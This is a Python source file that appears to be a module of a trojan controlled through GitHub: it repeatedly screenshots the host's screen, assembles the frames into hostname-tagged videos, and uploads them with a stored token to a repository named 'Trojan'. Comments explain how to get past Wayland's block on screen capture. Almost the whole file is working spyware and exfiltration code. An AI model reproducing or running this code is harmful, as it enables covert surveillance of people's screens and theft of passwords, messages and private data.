import cv2
import github3
#* pip install github3.py
import os
import pyautogui
import queue
import socket 
import threading

from datetime import datetime
from time import sleep

#? Will work for other OSs besides Windows without additional 
#? packages being installed, but Windows will work stand alone
#! You may have to disable Wayland as the display server, it does 
#! not let you screen grab the screen for security reasons
#! sudo nano /etc/gdm3/custom.conf, disable Wayland

#* pip install pyautogui
#* https://pyautogui.readthedocs.io/en/latest/
#* PyAutoGUI only runs on Windows, macOS, and Linux.
#* right now PyAutoGUI only handles the primary monitor
#* On Linux, you must run sudo apt-get install scrot to use the screenshot features.

#* pip install opencv-python
#* https://pypi.org/project/opencv-python/
#* https://docs.opencv.org/4.x/

#? Used for screen capture
HOSTNAME = socket.gethostname()
IMAGE_DIR = './images/'
VIDEO_DIR = './videos/'
SLEEP_TIME = .25
FPS = 4
MOVIE_DURATION_IN_FRAMES = 120
IMG_EXT = 'jpg'
VIDEO_EXT = 'mp4'

#? Used for GitHub Upload
TOK = f'./github_token.tok'
REP = 'Trojan'
REP_KEY_PTH = 'videos'


def github_connect():

    try:
        with open(TOK) as file:
            token = file.read()
    except Exception as e:
        print(f'Error:{e}')

    user = 'agogeio'
    sess = github3.login(token=token)
    #* To allow you to specify either a username and password combination or
    #* a token, none of the parameters are required. If you provide none of
    #* them, you will receive ``None``.

    try:
        github = sess.repository(user, REP)
        #? Gets the requested repo
        return github
    except Exception as e:
        print(f'GitHub connection error: {e}')
        return e


class ScreenCapture:
    def __init__(self) -> None:
        self.src_width, self.src_height = pyautogui.size()
        self.width = int(self.src_width)
        self.height = int(self.src_height)
        self.videoQueue =  queue.Queue()

    
    def getScreen(self):
        imgs = []
        frame = 0
        # cont = True

        # while cont == True:
        while True:
            try:
                image_path = f'{IMAGE_DIR}{HOSTNAME}-{frame}.{IMG_EXT}'
                screenshot = pyautogui.screenshot()
                screenshot = screenshot.resize((self.width, self.height))
                screenshot.save(image_path)
                imgs.append(image_path)
                frame += 1
                sleep(SLEEP_TIME)
            except Exception as e:
                print(f'Exception: {e}')

            if frame > MOVIE_DURATION_IN_FRAMES:
                self.makeMovie(imgs)
                frame = 0
                imgs = []


    def makeMovie(self, frames):

        now = datetime.now()
        current_time = now.strftime('%Y-%-j-%H-%M-%S')
        video_filename = f'{HOSTNAME}-{current_time}.{VIDEO_EXT}'
        video_path = f'{VIDEO_DIR}{video_filename}'

        fourcc = cv2.VideoWriter_fourcc('m', 'p', '4', 'v')
        video = cv2.VideoWriter(video_path, fourcc, FPS, (self.width, self.height))
        #? VideoWriter takes: output_name, fourcc, fps, size
        #* https://docs.opencv.org/3.4/dd/d9e/classcv_1_1VideoWriter.html

        for frame in frames:
            video.write(cv2.imread(frame))
        video.release()

        self.videoQueue.put(video_path)


    def getVideoQueue(self):
    #? Needed a method to get all videos
        return self.videoQueue


class GithubUpload:
    def __init__(self) -> None:
        self.data_path = f'{REP_KEY_PTH}/{id}/'
        self.repo = github_connect()   


    def store_result(self, video_path):
        sleep(.25)

        try:
            with open(video_path, 'rb') as file:
                filename = video_path.split('/')
                filename =  filename[2]
                data = file.read()
                remote_path = f'{REP_KEY_PTH}/{filename}'   
                bindata = bytes(data)
        except Exception as e:
            print(f'Read video error: {e}')

        try:
            self.repo.create_file(remote_path, filename, bindata)
            # print(f'File: {filename} created')
            #? This is the remote_path in the GitHub repo not on the local machine
            #* https://docs.github.com/en/rest/repos/contents?apiVersion=2022-11-28#create-a-file
        except Exception as e:
            print(f'Error in store_module_result: {e}')


def run(**args):
    sc = ScreenCapture()
    gu = GithubUpload()
    videos = sc.getVideoQueue()

    try:
        # print("In screen thread")
        screen_thread = threading.Thread(target=sc.getScreen)
        screen_thread.start()
        # print(f'Screen Thread Started: {threading.active_count()}')
    except Exception as e:
        print(f'Screen Capture Exception: {e}')

    while True:
        sleep(MOVIE_DURATION_IN_FRAMES*SLEEP_TIME)
        # screen_thread.join()
        # print('Waiting for queue get')
        video_path = videos.get()
        # print(f'Video Path: {video_path}')

        try:
            # print("In store result")
            upload_thread = threading.Thread(target=gu.store_result, args=(video_path,))
            upload_thread.start()
            print(f'Store Result Thread Started: {threading.active_count()}')
        except Exception as e:
            print(f'Store Result Exception: {e}')


if __name__ == '__main__':
    run()